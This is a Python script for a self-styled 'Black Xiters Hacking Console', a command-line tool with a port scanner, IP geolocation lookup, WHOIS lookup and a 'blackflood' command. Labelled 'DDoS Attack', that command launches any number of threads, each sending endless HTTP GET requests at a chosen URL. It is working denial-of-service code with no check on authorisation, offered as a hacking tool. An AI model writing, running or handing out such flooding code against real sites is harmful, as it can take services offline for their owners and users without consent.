from colorama import Fore , Style
from socket import *
import platform
import pyfiglet
import psutil
import os
import datetime
import socket
import requests
import whois
import threading
import time

def flood_target(url):
    while True:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(Fore.GREEN + f"[+] {url} is UP (200)")
            else:
                print(Fore.YELLOW + f"[!] {url} returned {response.status_code}")
        except requests.exceptions.RequestException:
            print(Fore.RED + f"[-] {url} is DOWN")
        time.sleep(0.5)

os.system("cls"  if os.name == "nt" else "clear")
banner = pyfiglet.figlet_format("BLACK-XITERS", font="doom")
print(Fore.GREEN + Style.BRIGHT + banner)

print(Fore.LIGHTBLACK_EX + Style.BRIGHT + "╔" + "═"*60 + "╗")
print(Fore.LIGHTBLACK_EX + Style.BRIGHT + "║" + Fore.GREEN + Style.BRIGHT +"        Welcome to the Black Xiters Hacking Console        " + Fore.LIGHTBLACK_EX +  Style.BRIGHT + "║")
print(Fore.LIGHTBLACK_EX + Style.BRIGHT + "╚" + "═"*60 + "╝")


print(Fore.MAGENTA + Style.BRIGHT + "\n┌─────────────────────[ SYSTEM INFORMATION ]─────────────────────" + Fore.RESET)
print(Fore.CYAN + f"│\n├── User         : {Fore.WHITE}{Style.BRIGHT}{os.getlogin():<36}{Fore.CYAN}")
print(Fore.CYAN + f"├── OS           : {Fore.WHITE}{Style.BRIGHT}{platform.system()} {platform.release():<29}{Fore.CYAN}")
print(Fore.CYAN + f"├── Hostname     : {Fore.WHITE}{Style.BRIGHT}{socket.gethostname():<36}{Fore.CYAN}")
print(Fore.CYAN + f"├── IP Address   : {Fore.WHITE}{Style.BRIGHT}{socket.gethostbyname(socket.gethostname()):<36}{Fore.CYAN}")
print(Fore.CYAN + f"├── CPU Cores    : {Fore.WHITE}{Style.BRIGHT}{str(psutil.cpu_count(logical=True))}")
print(Fore.CYAN + f"├── Date         : {Fore.WHITE}{Style.BRIGHT}{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<36}{Fore.CYAN}")
print(Fore.CYAN + "└────────────────────────────────────────────────────────\n" + Fore.RESET)


print(Fore.CYAN + Style.BRIGHT + "╔═════════════════════════════════════════[ COMMAND CENTER ]═════════════════════════════════════════╗")
print(Fore.RED + Style.BRIGHT + """
  [01] 》》  Port Scanner    -- scan open ports and vulnerabilities (airporthunter <IP-TARGET>)
  [02] 》》  IP Info         -- detailed network & geolocation info (ifinfo <IP-DOMAIN>)
  [03] 》》  Whois Lookup    -- domain ownership and registrar data (whois <exemple.com>)
  [04] 》》  DDoS Attack     -- simulate network stress tests (blackflood <https://exemple.com>)
  [05] 》》  Clear           -- clear colosole hacking
  [06] 》》  Exit            -- exit hacking console
""")
print(Fore.CYAN + Style.BRIGHT + "╚════════════════════════════════════════════════════════════════════════════════════════════════════╝")

while True:
      try:
            derectory = os.getcwd()
            prompt = f"{Fore.GREEN}{Style.BRIGHT}┌──({Fore.RESET}{Fore.BLUE}{Style.BRIGHT}kali@kali{Fore.RESET}{Fore.GREEN}{Style.BRIGHT})-[{Fore.RESET}{Fore.WHITE}{Style.BRIGHT}{derectory}{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}]{Fore.RESET}\n"
            prompt += f"{Fore.GREEN}{Style.BRIGHT}└─{Fore.RESET}{Fore.BLUE}{Style.BRIGHT}$ {Fore.RESET}"
            input_terminal = input(prompt).strip()
            if input_terminal.lower().startswith("airporthunter "):
                port_scan = input_terminal[14:].strip()
            
                os.system("cls" if os.name == "nt" else "clear")
                print(Fore.GREEN + Style.BRIGHT + pyfiglet.figlet_format("HUNTER", font="DOOM") + Fore.RESET)
                
                port_list = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 3306, 3389]
                
                print(f"[*] Starting AirPortHunter at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} EDT")
                print("─" * 35)
                print(Style.BRIGHT + f"{'PORT':<10}{'STATE':<10}{'SERVICE':<15}" + Style.RESET_ALL)
                print("─" * 35)

                for scan in port_list:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((port_scan, scan))
                        sock.close()

                        try:
                            service = getservbyport(scan)
                        except:
                            service = "unknown"

                        state_raw = "OPEN" if result == 0 else "CLOSED"
                        color = Fore.GREEN if result == 0 else Fore.RED

                        port_str = f"{scan}/tcp".ljust(10)
                        state_str = f"{state_raw}".ljust(10)
                        service_str = f"{service}".ljust(15)

                        print(f"{port_str}{color}{state_str}{Fore.RESET}{service_str}")

                    except socket.error as err:
                        print(Fore.RED + f"[!] Socket error: {err}" + Fore.RESET)

            elif input_terminal.lower().startswith("ipinfo "):
                  target = input_terminal[7:].strip()
                  os.system("cls"  if os.name == "nt" else "clear")
                  print(Fore.GREEN + Style.BRIGHT + pyfiglet.figlet_format("IP-INFO-OSINT" , font="doom"))
                  try:
                       print(Fore.YELLOW + Style.BRIGHT + f"\n[*] Fetching IP info for {target}...\n" + Fore.RESET)
                       response = requests.get(f"https://ipinfo.io/{target}/json")
                       if response.status_code == 200:
                            data = response.json()
                            print(Fore.MAGENTA + Style.BRIGHT + "\n┌─────────────────────[ IP INFO OSINT ]─────────────────────" + Fore.RESET)
                            print(Fore.CYAN + Style.BRIGHT + f"│\n├── IP\t          : {Fore.WHITE}{Style.BRIGHT}{data.get('ip', 'N/A')}{Fore.CYAN}")
                            print(Fore.CYAN + Style.BRIGHT + f"├── Hostname      : {Fore.WHITE}{Style.BRIGHT}{data.get('hostname', 'N/A')}{Fore.CYAN}")
                            print(Fore.CYAN + Style.BRIGHT + f"├── City          : {Fore.WHITE}{Style.BRIGHT}{data.get('city', 'N/A')}{Fore.CYAN}")
                            print(Fore.CYAN + Style.BRIGHT + f"├── Region        : {Fore.WHITE}{Style.BRIGHT}{data.get('region', 'N/A')}{Fore.CYAN}")
                            print(Fore.CYAN + Style.BRIGHT + f"├── Country       : {Fore.WHITE}{Style.BRIGHT}{data.get('country', 'N/A')}{Fore.CYAN}")
                            print(Fore.CYAN + Style.BRIGHT + f"├── Location      : {Fore.WHITE}{Style.BRIGHT}{data.get('loc', 'N/A')}{Fore.CYAN}")
                            print(Fore.CYAN + Style.BRIGHT + f"├── Org           : {Fore.WHITE}{Style.BRIGHT}{data.get('org', 'N/A')}{Fore.CYAN}")
                            print(Fore.CYAN + Style.BRIGHT + f"├── Timezone      : {Fore.WHITE}{Style.BRIGHT}{data.get('timezone', 'N/A')}{Fore.CYAN}")
                            print(Fore.CYAN + Style.BRIGHT + "└────────────────────────────────────────────────────────\n" + Fore.RESET)
                       else:
                            print(Fore.RED + Style.BRIGHT + "[!] Failed To Fetch Data" + Fore.RESET)
                  except Exception as error:
                       print(Fore.RED + f"[!] Error {error}\n" + Fore.RESET)
              
            elif input_terminal.lower().startswith("whois "):
                 Whois = input_terminal[6:].strip()
                 os.system("cls" if os.name == "nt" else "clear")
                 print(Fore.GREEN + Style.BRIGHT + pyfiglet.figlet_format("WHOIS-OSINT" , font="doom"))
                 try:
                      info = whois.whois(Whois)
                      print(Fore.MAGENTA + Style.BRIGHT + "\n┌─────────────────────[ WHOIS OSINT ]─────────────────────" + Fore.RESET)
                      print(Fore.CYAN + Style.BRIGHT + f"│\n├── Domain Name\t              : {Fore.WHITE}{Style.BRIGHT}{info.domain_name}{Fore.CYAN}")
                      print(Fore.CYAN + Style.BRIGHT + f"├── Registrar                 : {Fore.WHITE}{Style.BRIGHT}{info.registrar}{Fore.CYAN}")
                      print(Fore.CYAN + Style.BRIGHT + f"├── Creation Date             : {Fore.WHITE}{Style.BRIGHT}{info.creation_date}{Fore.CYAN}")
                      print(Fore.CYAN + Style.BRIGHT + f"├── Expiration                : {Fore.WHITE}{Style.BRIGHT}{info.expiration_date}{Fore.CYAN}")
                      print(Fore.CYAN + Style.BRIGHT + f"├── Name Servers              : {Fore.WHITE}{Style.BRIGHT}{info.name_servers}{Fore.CYAN}")
                      print(Fore.CYAN + Style.BRIGHT + f"├── Emails                    : {Fore.WHITE}{Style.BRIGHT}{info.emails}{Fore.CYAN}")
                      print(Fore.CYAN + Style.BRIGHT + f"├── Status                    : {Fore.WHITE}{Style.BRIGHT}{info.status}{Fore.CYAN}")
                      print(Fore.CYAN + Style.BRIGHT + f"├── Timezone                  : {Fore.WHITE}{Style.BRIGHT}{info.dnssec}{Fore.CYAN}")
                      print(Fore.CYAN + Style.BRIGHT + f"├── Updated Date              : {Fore.WHITE}{Style.BRIGHT}{info.updated_date}{Fore.CYAN}")
                      print(Fore.CYAN + Style.BRIGHT + "└────────────────────────────────────────────────────────\n" + Fore.RESET)
                 except:
                      print(Fore.RED + Style.BRIGHT + "[!] Error fetching WHOIS info")

            elif input_terminal.lower().startswith("blackflood "):
                try:
                    args = input_terminal[11:].strip().split()

                    if len(args) != 2:
                        print(Fore.RED + "[!] Usage: blackflood <URL> <THREADS>" + Fore.RESET)
                        continue

                    target_url = args[0]
                    try:
                        num_threads = int(args[1])
                    except ValueError:
                        print(Fore.RED + "[!] Number of threads must be an integer." + Fore.RESET)
                        continue

                    os.system("cls" if os.name == "nt" else "clear")
                    print(Fore.GREEN + Style.BRIGHT + pyfiglet.figlet_format("BLACK-FLOOD", font="doom"))

                    try:
                        response = requests.get(target_url)
                        if response.status_code == 200:
                            print(Fore.GREEN + f"[+] {target_url} is UP (200)" + Fore.RESET)
                        else:
                            print(Fore.YELLOW + f"[!] {target_url} returned {response.status_code}")
                    except requests.exceptions.RequestException:
                        print(Fore.RED + Style.BRIGHT + f"[-] {target_url} is DOWN or unreachable." + Fore.RESET)
                        continue

                    print(Fore.YELLOW + Style.BRIGHT + f"[*] Launching flood with {num_threads} threads...\n")

                    for _ in range(num_threads):
                        threading.Thread(target=flood_target, args=(target_url,), daemon=True).start()

                    try:
                        while True:
                            time.sleep(1)
                    except KeyboardInterrupt:
                        print(Fore.RED + Style.BRIGHT + "\n[!] Attack stopped by user." + Fore.RESET)
                except:
                     print(Fore.RED + Style.BRIGHT +  f"[!] Unexpected Error" + Fore.RESET)
                
            elif input_terminal.lower() == "exit":
                  break
            elif input_terminal.lower() == "clear" or input_terminal.lower() == "cls":
                os.system("cls"  if os.name == "nt" else "clear")
                banner = pyfiglet.figlet_format("BLACK-XITERS", font="doom")
                print(Fore.GREEN + Style.BRIGHT + banner)

                print(Fore.LIGHTBLACK_EX + Style.BRIGHT + "╔" + "═"*60 + "╗")
                print(Fore.LIGHTBLACK_EX + Style.BRIGHT + "║" + Fore.GREEN + Style.BRIGHT +"        Welcome to the Black Xiters Hacking Console        " + Fore.LIGHTBLACK_EX +  Style.BRIGHT + "║")
                print(Fore.LIGHTBLACK_EX + Style.BRIGHT + "╚" + "═"*60 + "╝")


                print(Fore.MAGENTA + Style.BRIGHT + "\n┌─────────────────────[ SYSTEM INFORMATION ]─────────────────────" + Fore.RESET)
                print(Fore.CYAN + f"│\n├── User         : {Fore.WHITE}{Style.BRIGHT}{os.getlogin():<36}{Fore.CYAN}")
                print(Fore.CYAN + f"├── OS           : {Fore.WHITE}{Style.BRIGHT}{platform.system()} {platform.release():<29}{Fore.CYAN}")
                print(Fore.CYAN + f"├── Hostname     : {Fore.WHITE}{Style.BRIGHT}{socket.gethostname():<36}{Fore.CYAN}")
                print(Fore.CYAN + f"├── IP Address   : {Fore.WHITE}{Style.BRIGHT}{socket.gethostbyname(socket.gethostname()):<36}{Fore.CYAN}")
                print(Fore.CYAN + f"├── CPU Cores    : {Fore.WHITE}{Style.BRIGHT}{str(psutil.cpu_count(logical=True))}")
                print(Fore.CYAN + f"├── Date         : {Fore.WHITE}{Style.BRIGHT}{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<36}{Fore.CYAN}")
                print(Fore.CYAN + "└────────────────────────────────────────────────────────\n" + Fore.RESET)


                print(Fore.CYAN + Style.BRIGHT + "╔═════════════════════════════════════════[ COMMAND CENTER ]═════════════════════════════════════════╗")
                print(Fore.RED + Style.BRIGHT + """
  [01] 》》  Port Scanner    -- scan open ports and vulnerabilities (airporthunter <IP-TARGET>)
  [02] 》》  IP Info         -- detailed network & geolocation info (ifinfo <IP-DOMAIN>)
  [03] 》》  Whois Lookup    -- domain ownership and registrar data (whois <exemple.com>)
  [04] 》》  DDoS Attack     -- simulate network stress tests (blackflood <https://exemple.com>)
  [05] 》》  Clear           -- clear colosole hacking
  [06] 》》  Exit            -- exit hacking console
                """)
                print(Fore.CYAN + Style.BRIGHT + "╚════════════════════════════════════════════════════════════════════════════════════════════════════╝")
            else:
                print(f"[!] command not found {input_terminal}")
      except Exception as error:
            print(Fore.RED + Style.BRIGHT + f"[!] Error For {error}" + Fore.RESET)
